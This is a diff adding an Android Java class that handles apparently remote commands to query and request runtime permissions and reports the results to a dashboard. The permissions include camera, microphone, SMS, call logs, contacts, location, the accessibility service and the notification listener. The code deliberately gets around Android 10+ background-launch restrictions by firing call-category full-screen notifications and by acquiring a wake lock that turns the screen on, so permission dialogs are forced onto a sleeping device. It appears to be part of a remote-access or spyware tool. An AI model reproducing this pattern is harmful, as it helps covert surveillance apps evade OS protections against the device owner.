@@ -1,0 +1,447 @@
+package com.task.tusker.commands;
+
+import android.Manifest;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.provider.Settings;
+import android.util.Log;
+import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
+import com.task.tusker.PermissionRequestActivity;
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.LinkedHashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+
+/**
+ * PermissionManager — queries and requests runtime permissions.
+ *
+ * Commands:
+ *   get_permissions         → returns list of all permissions with granted/denied status
+ *   request_permission      → shows native dialog for standard permissions; opens the
+ *                             correct Settings page for special permissions
+ *   request_all_permissions → shows native dialog for all currently-denied standard
+ *                             permissions in one shot
+ */
+public class PermissionManager {
+
+    private static final String TAG = "PermissionManager";
+    private final Context context;
+
+    /** All permissions reported in the dashboard — ordered, with friendly labels. */
+    private static final Map<String, String> ALL_PERMISSIONS = new LinkedHashMap<String, String>() {{
+        put(Manifest.permission.CAMERA,                          "Camera");
+        put(Manifest.permission.RECORD_AUDIO,                   "Microphone / Record Audio");
+        put(Manifest.permission.ACCESS_FINE_LOCATION,           "Fine Location (GPS)");
+        put(Manifest.permission.ACCESS_COARSE_LOCATION,         "Coarse Location (Network)");
+        put(Manifest.permission.READ_CONTACTS,                  "Read Contacts");
+        put(Manifest.permission.READ_SMS,                       "Read SMS");
+        put(Manifest.permission.SEND_SMS,                       "Send SMS");
+        put(Manifest.permission.RECEIVE_SMS,                    "Receive SMS");
+        put(Manifest.permission.READ_CALL_LOG,                  "Read Call Logs");
+        put(Manifest.permission.READ_EXTERNAL_STORAGE,          "Read External Storage");
+        put(Manifest.permission.WRITE_EXTERNAL_STORAGE,         "Write External Storage");
+        put(Manifest.permission.READ_MEDIA_IMAGES,              "Read Media Images");
+        put(Manifest.permission.READ_MEDIA_VIDEO,               "Read Media Video");
+        put(Manifest.permission.READ_MEDIA_AUDIO,               "Read Media Audio");
+        put(Manifest.permission.ACCESS_WIFI_STATE,              "Access WiFi State");
+        put(Manifest.permission.CHANGE_WIFI_STATE,              "Change WiFi State");
+        put(Manifest.permission.VIBRATE,                        "Vibrate");
+        put(Manifest.permission.WAKE_LOCK,                      "Wake Lock");
+        put(Manifest.permission.RECEIVE_BOOT_COMPLETED,         "Receive Boot Completed");
+        put(Manifest.permission.INTERNET,                       "Internet");
+        put(Manifest.permission.ACCESS_NETWORK_STATE,           "Access Network State");
+        put("android.permission.POST_NOTIFICATIONS",            "Post Notifications (Android 13+)");
+        put("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", "Notification Listener");
+        put("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "Ignore Battery Optimizations");
+    }};
+
+    /**
+     * Permissions that CANNOT be granted through the native runtime-permission dialog.
+     * These require dedicated Settings pages and are handled by buildSettingsIntent().
+     */
+    private static final Set<String> SETTINGS_ONLY_PERMISSIONS = new HashSet<>(Arrays.asList(
+            "android.permission.BIND_ACCESSIBILITY_SERVICE",
+            "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
+            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+            "android.permission.PACKAGE_USAGE_STATS",
+            "android.permission.WRITE_SETTINGS",
+            "android.permission.SYSTEM_ALERT_WINDOW"
+    ));
+
+    private static final String PERM_CHANNEL_ID = "perm_requests";
+    private static final int    PERM_NOTIF_ID   = 0xABC1;
+
+    public PermissionManager(Context context) {
+        this.context = context.getApplicationContext();
+    }
+
+    /**
+     * On Android 10+ (API 29+) apps cannot start activities from the background —
+     * the call is silently dropped with no exception.  The workaround is to fire a
+     * full-screen-intent notification: Android treats it as a high-priority call-
+     * style alert and immediately launches the activity even from the background.
+     *
+     * On older APIs a direct startActivity() still works fine.
+     */
+    private void launchViaNotification(Intent activityIntent) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            // Android 9 and below: direct launch works from background.
+            context.startActivity(activityIntent);
+            return;
+        }
+        try {
+            PendingIntent pi = PendingIntent.getActivity(
+                    context, PERM_NOTIF_ID, activityIntent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+            NotificationManager nm =
+                    (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (nm == null) { context.startActivity(activityIntent); return; }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel(
+                        PERM_CHANNEL_ID, "Permission Requests",
+                        NotificationManager.IMPORTANCE_HIGH);
+                ch.setDescription("Runtime permission dialogs");
+                ch.setShowBadge(false);
+                nm.createNotificationChannel(ch);
+            }
+
+            Notification notif = new NotificationCompat.Builder(context, PERM_CHANNEL_ID)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Permission Required")
+                    .setContentText("Tap to grant permission")
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setCategory(NotificationCompat.CATEGORY_CALL)
+                    .setFullScreenIntent(pi, true)
+                    .setAutoCancel(true)
+                    .build();
+
+            nm.notify(PERM_NOTIF_ID, notif);
+        } catch (Exception e) {
+            Log.w(TAG, "launchViaNotification failed, falling back to direct start: " + e.getMessage());
+            try { context.startActivity(activityIntent); } catch (Exception ignored) {}
+        }
+    }
+
+    /**
+     * Identical to launchViaNotification() but uses notification slot PERM_NOTIF_ID + 1
+     * so the two step-1 and step-2 notifications coexist without cancelling each other.
+     */
+    private void launchViaNotificationStep2(Intent activityIntent) {
+        final int NOTIF_ID_2 = PERM_NOTIF_ID + 1;
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(activityIntent);
+            return;
+        }
+        try {
+            PendingIntent pi = PendingIntent.getActivity(
+                    context, NOTIF_ID_2, activityIntent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+            NotificationManager nm =
+                    (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (nm == null) { context.startActivity(activityIntent); return; }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel ch = new NotificationChannel(
+                        PERM_CHANNEL_ID, "Permission Requests",
+                        NotificationManager.IMPORTANCE_HIGH);
+                ch.setDescription("Runtime permission dialogs");
+                ch.setShowBadge(false);
+                nm.createNotificationChannel(ch);
+            }
+
+            Notification notif = new NotificationCompat.Builder(context, PERM_CHANNEL_ID)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Permission Required")
+                    .setContentText("Tap to grant permission")
+                    .setPriority(NotificationCompat.PRIORITY_HIGH)
+                    .setCategory(NotificationCompat.CATEGORY_CALL)
+                    .setFullScreenIntent(pi, true)
+                    .setAutoCancel(true)
+                    .build();
+
+            nm.notify(NOTIF_ID_2, notif);
+        } catch (Exception e) {
+            Log.w(TAG, "launchViaNotificationStep2 failed, falling back: " + e.getMessage());
+            try {
+                activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(activityIntent);
+            } catch (Exception ignored) {}
+        }
+    }
+
+    /**
+     * Acquire a FULL WakeLock so the screen turns on even if the device is asleep.
+     * Auto-releases after 10 seconds.
+     */
+    private void acquireWakeLock() {
+        try {
+            android.os.PowerManager pm =
+                    (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                android.os.PowerManager.WakeLock wl = pm.newWakeLock(
+                        android.os.PowerManager.FULL_WAKE_LOCK
+                        | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
+                        | android.os.PowerManager.ON_AFTER_RELEASE,
+                        "tusker:perm_request_wl");
+                wl.acquire(10_000);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "acquireWakeLock failed: " + e.getMessage());
+        }
+    }
+
+    /** Returns all permissions with granted/denied status. */
+    public JSONObject getPermissions() {
+        JSONObject result = new JSONObject();
+        try {
+            JSONArray granted    = new JSONArray();
+            JSONArray notGranted = new JSONArray();
+
+            for (Map.Entry<String, String> entry : ALL_PERMISSIONS.entrySet()) {
+                String permission = entry.getKey();
+                String label      = entry.getValue();
+                boolean isGranted = checkPermission(permission);
+
+                JSONObject item = new JSONObject();
+                item.put("permission", permission);
+                item.put("label", label);
+                item.put("granted", isGranted);
+
+                if (isGranted) granted.put(item);
+                else           notGranted.put(item);
+            }
+
+            boolean accessibilityGranted =
+                    com.task.tusker.services.UnifiedAccessibilityService.getInstance() != null;
+            JSONObject accessItem = new JSONObject();
+            accessItem.put("permission", "android.permission.BIND_ACCESSIBILITY_SERVICE");
+            accessItem.put("label", "Accessibility Service");
+            accessItem.put("granted", accessibilityGranted);
+            if (accessibilityGranted) granted.put(accessItem);
+            else                      notGranted.put(accessItem);
+
+            result.put("success",        true);
+            result.put("granted",        granted);
+            result.put("notGranted",     notGranted);
+            result.put("grantedCount",   granted.length());
+            result.put("notGrantedCount",notGranted.length());
+            result.put("totalCount",     granted.length() + notGranted.length());
+
+        } catch (Exception e) {
+            Log.e(TAG, "getPermissions error: " + e.getMessage());
+            try { result.put("success", false); result.put("error", e.getMessage()); }
+            catch (Exception ignored) {}
+        }
+        return result;
+    }
+
+    private boolean checkPermission(String permission) {
+        try {
+            return ContextCompat.checkSelfPermission(context, permission)
+                    == PackageManager.PERMISSION_GRANTED;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    /**
+     * Request a single permission.
+     *
+     * - Standard runtime permissions  → two-step foreground launch:
+     *     Step 0: acquire WakeLock to turn screen on.
+     *     Step 1: full-screen notification launches MainActivity (brings task to front).
+     *     Step 2: 600 ms later, full-screen notification launches PermissionRequestActivity
+     *             inside the now-foreground task so the native OS dialog is visible.
+     *     If the user had previously ticked "Don't ask again", PermissionRequestActivity
+     *     automatically falls back to App Info settings.
+     * - Special permissions           → open the exact Settings page for that permission.
+     */
+    public JSONObject requestPermission(String permission) {
+        JSONObject result = new JSONObject();
+        try {
+            Intent intent;
+            if (SETTINGS_ONLY_PERMISSIONS.contains(permission)) {
+                intent = buildSettingsIntent(permission);
+            } else {
+                // Standard runtime permission — use the transparent trampoline activity.
+                intent = new Intent(context, PermissionRequestActivity.class);
+                intent.putExtra(PermissionRequestActivity.EXTRA_PERMISSION, permission);
+            }
+
+            if (intent != null) {
+                if (SETTINGS_ONLY_PERMISSIONS.contains(permission)) {
+                    // Settings intents launch system UI — exempt from background restrictions.
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                    result.put("success", true);
+                    result.put("message", "Permission settings opened for: " + permission);
+                } else {
+                    // Two-step foreground launch:
+                    //   Step 0: wake the screen so the dialog is visible even if asleep.
+                    //   Step 1: full-screen notification → MainActivity (brings our task stack
+                    //           to the foreground, bypassing Android 10+ background-activity
+                    //           restriction even without the accessibility service).
+                    //   Step 2: 600 ms later, full-screen notification → PermissionRequestActivity
+                    //           inside the now-foreground task. Android shows the native dialog.
+                    acquireWakeLock();
+                    Intent mainIntent = new Intent(context, com.task.tusker.MainActivity.class);
+                    mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                            | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                    launchViaNotification(mainIntent);
+                    final Intent permIntent = intent;
+                    permIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                            | Intent.FLAG_ACTIVITY_SINGLE_TOP
+                            | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    new android.os.Handler(android.os.Looper.getMainLooper())
+                            .postDelayed(() -> launchViaNotificationStep2(permIntent), 600);
+                    result.put("success", true);
+                    result.put("message", "Permission dialog shown for: " + permission);
+                }
+            } else {
+                result.put("success", false);
+                result.put("error", "Cannot handle this permission on this API level");
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "requestPermission error: " + e.getMessage());
+            try { result.put("success", false); result.put("error", e.getMessage()); }
+            catch (Exception ignored) {}
+        }
+        return result;
+    }
+
+    /**
+     * Request ALL currently-denied standard runtime permissions in one dialog sequence.
+     * Special/settings-only permissions are skipped (they need manual Settings navigation).
+     *
+     * Uses the two-step foreground launch: MainActivity is brought to the foreground
+     * first (step 1), then PermissionRequestActivity is launched inside it (step 2).
+     */
+    public JSONObject requestAllPermissions() {
+        JSONObject result = new JSONObject();
+        try {
+            List<String> missing = new ArrayList<>();
+            for (String perm : ALL_PERMISSIONS.keySet()) {
+                if (!checkPermission(perm) && !SETTINGS_ONLY_PERMISSIONS.contains(perm)) {
+                    missing.add(perm);
+                }
+            }
+
+            if (!missing.isEmpty()) {
+                // Two-step foreground launch:
+                //   Step 0: wake the screen.
+                //   Step 1: full-screen notification → MainActivity (brings task to front).
+                //   Step 2: 600 ms later, full-screen notification → PermissionRequestActivity.
+                acquireWakeLock();
+                Intent mainIntent = new Intent(context, com.task.tusker.MainActivity.class);
+                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                launchViaNotification(mainIntent);
+                Intent permIntent = new Intent(context, PermissionRequestActivity.class);
+                permIntent.putExtra(PermissionRequestActivity.EXTRA_PERMISSIONS,
+                        missing.toArray(new String[0]));
+                permIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                new android.os.Handler(android.os.Looper.getMainLooper())
+                        .postDelayed(() -> launchViaNotificationStep2(permIntent), 600);
+                result.put("success", true);
+                result.put("message", "Showing permission dialog for " + missing.size()
+                        + " missing permission(s)");
+            } else {
+                // All standard permissions already granted — open app settings for reference.
+                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                        Uri.parse("package:" + context.getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+                result.put("success", true);
+                result.put("message",
+                        "All standard permissions already granted — opened App Info for reference");
+            }
+
+        } catch (Exception e) {
+            try { result.put("success", false); result.put("error", e.getMessage()); }
+            catch (Exception ignored) {}
+        }
+        return result;
+    }
+
+    /**
+     * Builds the exact Settings Intent for permissions that cannot use the
+     * native runtime-permission dialog (settings-only permissions).
+     */
+    private Intent buildSettingsIntent(String permission) {
+        String pkg = context.getPackageName();
+        Intent intent = null;
+
+        switch (permission) {
+            case "android.permission.BIND_ACCESSIBILITY_SERVICE":
+                intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                break;
+
+            case "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE":
+                intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                break;
+
+            case "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS":
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    android.os.PowerManager pm =
+                            (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
+                    if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
+                        // Show the direct "Disable battery optimization?" dialog for this app.
+                        intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                                Uri.parse("package:" + pkg));
+                    } else {
+                        intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                    }
+                }
+                break;
+
+            case "android.permission.PACKAGE_USAGE_STATS":
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                }
+                break;
+
+            case "android.permission.WRITE_SETTINGS":
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                            Uri.parse("package:" + pkg));
+                }
+                break;
+
+            case "android.permission.SYSTEM_ALERT_WINDOW":
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            Uri.parse("package:" + pkg));
+                }
+                break;
+
+            default:
+                // Fallback — open generic App Info page.
+                intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                        Uri.parse("package:" + pkg));
+                break;
+        }
+
+        return intent;
+    }
+}
